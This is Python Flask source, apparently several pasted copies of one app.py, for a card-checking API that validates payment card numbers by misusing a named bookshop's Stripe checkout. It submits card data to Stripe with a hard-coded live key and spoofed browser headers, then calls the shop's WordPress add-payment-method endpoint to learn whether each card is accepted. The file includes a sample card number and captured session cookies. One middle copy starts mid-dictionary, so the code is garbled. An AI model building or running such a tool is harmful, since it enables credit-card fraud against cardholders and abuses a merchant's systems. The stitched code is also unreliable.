# app.py
from flask import Flask, request, jsonify
import requests
import re
import uuid
import time

app = Flask(__name__)

def parse_card_data(card_string):
    """Parse card data from the format: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv"""
    parts = card_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid format. Use: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv")
    
    card_no, month, year, cvv = parts
    
    # Clean and format card number
    card_no = re.sub(r'\s+', '', card_no)
    card_no = re.sub(r'[^\d]', '', card_no)
    
    # Format year
    if len(year) == 4:
        year = year[2:]
    elif len(year) != 2:
        raise ValueError("Year should be 2 or 4 digits")
    
    # Ensure month is 2 digits
    month = month.zfill(2)
    
    # Validate CVV
    cvv = re.sub(r'[^\d]', '', cvv)
    
    return card_no, month, year, cvv

def format_card_number(card_no):
    """Format card number with spaces for display"""
    groups = []
    for i in range(0, len(card_no), 4):
        groups.append(card_no[i:i+4])
    return ' '.join(groups)

def generate_dynamic_data(site, card_no, month, year, cvv):
    """Generate dynamic data for Stripe API call"""
    # Generate fresh UUIDs
    guid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
    muid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
    sid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
    client_session_id = str(uuid.uuid4())
    elements_session_id = str(uuid.uuid4())
    
    # Current timestamp
    current_time = int(time.time())
    time_on_page = current_time - (current_time % 1000)
    
    # Format card number
    formatted_card = format_card_number(card_no)
    
    # Create dynamic data
    stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={month}'
    stripe_data += '&allow_redisplay=unspecified'
    stripe_data += '&billing_details[address][country]=IN'
    stripe_data += f'&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent'
    stripe_data += f'&referrer=https%3A%2F%2F{site}'
    stripe_data += f'&time_on_page={time_on_page}'
    stripe_data += f'&client_attribution_metadata[client_session_id]={client_session_id}'
    stripe_data += '&client_attribution_metadata[merchant_integration_source]=elements'
    stripe_data += '&client_attribution_metadata[merchant_integration_subtype]=payment-element'
    stripe_data += '&client_attribution_metadata[merchant_integration_version]=2024'
    stripe_data += '&client_attribution_metadata[payment_intent_creation_flow]=deferred'
    stripe_data += '&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
    stripe_data += f'&client_attribution_metadata[elements_session_config_id]={elements_session_id}'
    stripe_data += '&client_attribution_metadata[merchant_integration_additional_elements][0]=payment'
    stripe_data += f'&guid={guid}'
    stripe_data += f'&muid={muid}'
    stripe_data += f'&sid={sid}'
    stripe_data += '&key=pk_live_51KRko2JqYWyFfgByqMLZrabF5QnEd3NY3j57vXcFfmkbXsM84noWXNl8ZtvNwsxu3HWFIB2AnvTjjhKDD2zlV40o00zSgONFxu'
    stripe_data += '&_stripe_version=2024-12-11'
    stripe_data += '&radar_options[hcaptcha_token]='
    
    return stripe_data

@app.route('/gateway=stripeauth/site=<site>/cc=<card_data>', methods=['GET'])
def stripe_payment(site, card_data):
    try:
        # Parse card data
        card_no, month, year, cvv = parse_card_data(card_data)
        
        # Generate dynamic data for Stripe API
        stripe_data = generate_dynamic_data(site, card_no, month, year, cvv)
        
        # Stripe headers - updated with more generic values
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        }

        # Make request to Stripe
        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=30
        )

        # Log Stripe response for debugging
        print(f"Stripe Status: {stripe_response.status_code}")
        print(f"Stripe Response: {stripe_response.text[:200]}...")

        if stripe_response.status_code != 200:
            return jsonify({
                'status': 'declined',
                'response': 'card was declined - Stripe API error',
                'debug': f'Stripe status: {stripe_response.status_code}'
            }), 200

        stripe_data_response = stripe_response.json()
        payment_method_id = stripe_data_response.get('id')
        
        if not payment_method_id:
            return jsonify({
                'status': 'declined',
                'response': 'card was declined - No payment method ID',
                'debug': stripe_data_response
            }), 200

        # Generate fresh cookies for site request
        current_time = int(time.time())
        wordpress_token = f"user%7C{current_time + 86400}%7C{str(uuid.uuid4())}"
        
        # Create dynamic cookies
        site_cookies = {
            'wordpress_logged_in_' + str(uuid.uuid4())[:8]: wordpress_token,
            '__stripe_mid': str(uuid.uuid4()),
            '__stripe_sid': str(uuid.uuid4()),
            '_ga': 'GA1.1.' + str(int(time.time())) + '.' + str(current_time),
        }

        # Site headers
        site_headers = {
            'authority': site,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': f'https://{site}',
            'referer': f'https://{site}/my-account/add-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        # Generate fresh nonce (in real scenario, you'd need to fetch this from the site)
        nonce = str(uuid.uuid4())[:10]

        site_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        # Make request to merchant site
        site_response = requests.post(
            f'https://{site}/wp-admin/admin-ajax.php',
            cookies=site_cookies,
            headers=site_headers,
            data=site_data,
            timeout=30,
            verify=True  # Enable SSL verification
        )

        print(f"Site Status: {site_response.status_code}")
        print(f"Site Response: {site_response.text[:200]}...")

        # Check response
        if site_response.status_code == 200:
            try:
                response_json = site_response.json()
                if isinstance(response_json, dict):
                    if response_json.get('result') == 'success' or 'success' in str(response_json).lower():
                        return jsonify({
                            'status': 'approved',
                            'response': 'payment method added successfully',
                            'debug': 'Site API returned success'
                        }), 200
            except:
                # If JSON parsing fails but status is 200, check text
                if 'success' in site_response.text.lower():
                    return jsonify({
                        'status': 'approved',
                        'response': 'payment method added successfully',
                        'debug': 'Success found in response text'
                    }), 200
        
        return jsonify({
            'status': 'declined',
            'response': 'card was declined',
            'debug': {
                'stripe_status': stripe_response.status_code,
                'site_status': site_response.status_code,
                'site_response': site_response.text[:500] if site_response.text else 'No response'
            }
        }), 200

    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({
            'status': 'declined',
            'response': 'card was declined',
            'debug': f'Exception: {str(e)}'
        }), 200

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'service': 'stripe-payment-gateway'
    }), 200

@app.route('/')
def index():
    return jsonify({
        'message': 'Stripe Payment Gateway API',
        'usage': 'GET /gateway=stripeauth/site=<site>/cc=<card_no|mm|yy|cvv>',
        'example': '/gateway=stripeauth/site=bookshop.multilit.com/cc=5403856014744764|04|26|579',
        'note': 'All responses return HTTP 200 with status in JSON body'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)            '__cf_bm': 'FIPqFE__im4yxCILgfear5yVUpTH5L618mFvRFlereI-1765473036-1.0.1.1-TBf988Mm9dL8AJZhYL_0vUzMYBMlcRQYzjkD6zaCsf71fX5CsnYXW._xI_8xY.QuReOAHscZ2bxqPA5BQFS1B7go8f8XKaTOCP_MJ9TdeUk',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-12-11%2016%3A40%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F',
            'sbjs_first_add': 'fd%3D2025-12-11%2016%3A40%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fpayment-methods%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbookshop.multilit.com%2Fmy-account%2Fadd-payment-method%2F',
            '_hjSession_3261952': 'eyJpZCI6IjRmOTc3OTQ5LTk3ZGYtNGEyYy05NGU2LTIwNjE2MDQ5Y2M0YyIsImMiOjE3NjU0NzMwMzc2NjksInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
            '__hstc': '77795275.f1dee68925d61cf3b3d89818b575abf4.1764575861088.1765294028613.1765473039486.4',
            '__hssrc': '1',
            '__hssc': '77795275.1.1765473039486',
            '__stripe_sid': '53349dc5-0552-4215-90ae-3a00a4475b7dc5a0cc',
            '_ga_CVFG3GFJ51': 'GS2.1.s1765473036$o4$g0$t1765473067$j29$l0$h0',
        }

        site_headers = {
            'authority': site,
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': f'https://{site}',
            'referer': f'https://{site}/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        site_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': '7817991406',
        }

        # Make second request to merchant site
        site_response = requests.post(
            f'https://{site}/wp-admin/admin-ajax.php',
            cookies=site_cookies,
            headers=site_headers,
            data=site_data
        )

        # Check if the site response indicates success
        try:
            site_response_json = site_response.json()
            # Check for success indicators in the response
            if site_response.status_code == 200:
                # Look for success indicators in the response
                response_str = str(site_response_json).lower()
                if any(success_indicator in response_str for success_indicator in [ 'succeeded', 'active', 'true', 'paymentmethod']):
                    return jsonify({
                        'status': 'approved',
                        'response': 'payment method added successfully'
                    }), 200
                else:
                    return jsonify({
                        'status': 'declined',
                        'response': 'card was declined'
                    }), 200
            else:
                return jsonify({
                    'status': 'declined',
                    'response': 'card was declined'
                }), 200
        except:
            # If JSON parsing fails, check status code
            if site_response.status_code == 200:
                return jsonify({
                    'status': 'approved',
                    'response': 'payment method added successfully'
                }), 200
            else:
                return jsonify({
                    'status': 'declined',
                    'response': 'card was declined'
                }), 200

    except ValueError as e:
        return jsonify({
            'status': 'declined',
            'response': 'card was declined'
        }), 200
    except Exception as e:
        return jsonify({
            'status': 'declined',
            'response': 'card was declined'
        }), 200

@app.route('/')
def index():
    return jsonify({
        'message': 'Stripe Payment Gateway API',
        'usage': 'GET /gateway=stripeauth/site=<site>/cc=<card_no|mm|yy|cvv>',
        'example': '/gateway=stripeauth/site=bookshop.multilit.com/cc=5403856014744764|04|26|579',
        'response_format': {
            'approved': {'status': 'approved', 'response': 'payment method added successfully'},
            'declined': {'status': 'declined', 'response': 'card was declined'}
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1100, debug=True)
# app.py
from flask import Flask, request, jsonify
import requests
import re
import uuid
import time

app = Flask(__name__)

def parse_card_data(card_string):
    """Parse card data from the format: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv"""
    parts = card_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid format. Use: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv")
    
    card_no, month, year, cvv = parts
    
    # Clean and format card number
    card_no = re.sub(r'\s+', '', card_no)
    card_no = re.sub(r'[^\d]', '', card_no)
    
    # Format year
    if len(year) == 4:
        year = year[2:]
    elif len(year) != 2:
        raise ValueError("Year should be 2 or 4 digits")
    
    # Ensure month is 2 digits
    month = month.zfill(2)
    
    # Validate CVV
    cvv = re.sub(r'[^\d]', '', cvv)
    
    return card_no, month, year, cvv

def format_card_number(card_no):
    """Format card number with spaces for display"""
    groups = []
    for i in range(0, len(card_no), 4):
        groups.append(card_no[i:i+4])
    return ' '.join(groups)

def generate_dynamic_data(site, card_no, month, year, cvv):
    """Generate dynamic data for Stripe API call"""
    # Generate fresh UUIDs
    guid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
    muid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
    sid = str(uuid.uuid4()) + str(uuid.uuid4())[:6]
    client_session_id = str(uuid.uuid4())
    elements_session_id = str(uuid.uuid4())
    
    # Current timestamp
    current_time = int(time.time())
    time_on_page = current_time - (current_time % 1000)
    
    # Format card number
    formatted_card = format_card_number(card_no)
    
    # Create dynamic data
    stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={month}'
    stripe_data += '&allow_redisplay=unspecified'
    stripe_data += '&billing_details[address][country]=IN'
    stripe_data += f'&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent'
    stripe_data += f'&referrer=https%3A%2F%2F{site}'
    stripe_data += f'&time_on_page={time_on_page}'
    stripe_data += f'&client_attribution_metadata[client_session_id]={client_session_id}'
    stripe_data += '&client_attribution_metadata[merchant_integration_source]=elements'
    stripe_data += '&client_attribution_metadata[merchant_integration_subtype]=payment-element'
    stripe_data += '&client_attribution_metadata[merchant_integration_version]=2024'
    stripe_data += '&client_attribution_metadata[payment_intent_creation_flow]=deferred'
    stripe_data += '&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
    stripe_data += f'&client_attribution_metadata[elements_session_config_id]={elements_session_id}'
    stripe_data += '&client_attribution_metadata[merchant_integration_additional_elements][0]=payment'
    stripe_data += f'&guid={guid}'
    stripe_data += f'&muid={muid}'
    stripe_data += f'&sid={sid}'
    stripe_data += '&key=pk_live_51KRko2JqYWyFfgByqMLZrabF5QnEd3NY3j57vXcFfmkbXsM84noWXNl8ZtvNwsxu3HWFIB2AnvTjjhKDD2zlV40o00zSgONFxu'
    stripe_data += '&_stripe_version=2024-12-11'
    stripe_data += '&radar_options[hcaptcha_token]='
    
    return stripe_data

@app.route('/gateway=stripeauth/site=<site>/cc=<card_data>', methods=['GET'])
def stripe_payment(site, card_data):
    try:
        # Parse card data
        card_no, month, year, cvv = parse_card_data(card_data)
        
        # Generate dynamic data for Stripe API
        stripe_data = generate_dynamic_data(site, card_no, month, year, cvv)
        
        # Stripe headers - updated with more generic values
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        }

        # Make request to Stripe
        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=30
        )

        # Log Stripe response for debugging
        print(f"Stripe Status: {stripe_response.status_code}")
        print(f"Stripe Response: {stripe_response.text[:200]}...")

        if stripe_response.status_code != 200:
            return jsonify({
                'status': 'declined',
                'response': 'card was declined - Stripe API error',
                'debug': f'Stripe status: {stripe_response.status_code}'
            }), 200

        stripe_data_response = stripe_response.json()
        payment_method_id = stripe_data_response.get('id')
        
        if not payment_method_id:
            return jsonify({
                'status': 'declined',
                'response': 'card was declined - No payment method ID',
                'debug': stripe_data_response
            }), 200

        # Generate fresh cookies for site request
        current_time = int(time.time())
        wordpress_token = f"user%7C{current_time + 86400}%7C{str(uuid.uuid4())}"
        
        # Create dynamic cookies
        site_cookies = {
            'wordpress_logged_in_' + str(uuid.uuid4())[:8]: wordpress_token,
            '__stripe_mid': str(uuid.uuid4()),
            '__stripe_sid': str(uuid.uuid4()),
            '_ga': 'GA1.1.' + str(int(time.time())) + '.' + str(current_time),
        }

        # Site headers
        site_headers = {
            'authority': site,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': f'https://{site}',
            'referer': f'https://{site}/my-account/add-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        # Generate fresh nonce (in real scenario, you'd need to fetch this from the site)
        nonce = str(uuid.uuid4())[:10]

        site_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        # Make request to merchant site
        site_response = requests.post(
            f'https://{site}/wp-admin/admin-ajax.php',
            cookies=site_cookies,
            headers=site_headers,
            data=site_data,
            timeout=30,
            verify=True  # Enable SSL verification
        )

        print(f"Site Status: {site_response.status_code}")
        print(f"Site Response: {site_response.text[:200]}...")

        # Check response
        if site_response.status_code == 200:
            try:
                response_json = site_response.json()
                if isinstance(response_json, dict):
                    if response_json.get('result') == 'success' or 'success' in str(response_json).lower():
                        return jsonify({
                            'status': 'approved',
                            'response': 'payment method added successfully',
                            'debug': 'Site API returned success'
                        }), 200
            except:
                # If JSON parsing fails but status is 200, check text
                if 'success' in site_response.text.lower():
                    return jsonify({
                        'status': 'approved',
                        'response': 'payment method added successfully',
                        'debug': 'Success found in response text'
                    }), 200
        
        return jsonify({
            'status': 'declined',
            'response': 'card was declined',
            'debug': {
                'stripe_status': stripe_response.status_code,
                'site_status': site_response.status_code,
                'site_response': site_response.text[:500] if site_response.text else 'No response'
            }
        }), 200

    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({
            'status': 'declined',
            'response': 'card was declined',
            'debug': f'Exception: {str(e)}'
        }), 200

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'service': 'stripe-payment-gateway'
    }), 200

@app.route('/')
def index():
    return jsonify({
        'message': 'Stripe Payment Gateway API',
        'usage': 'GET /gateway=stripeauth/site=<site>/cc=<card_no|mm|yy|cvv>',
        'example': '/gateway=stripeauth/site=bookshop.multilit.com/cc=5403856014744764|04|26|579',
        'note': 'All responses return HTTP 200 with status in JSON body'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
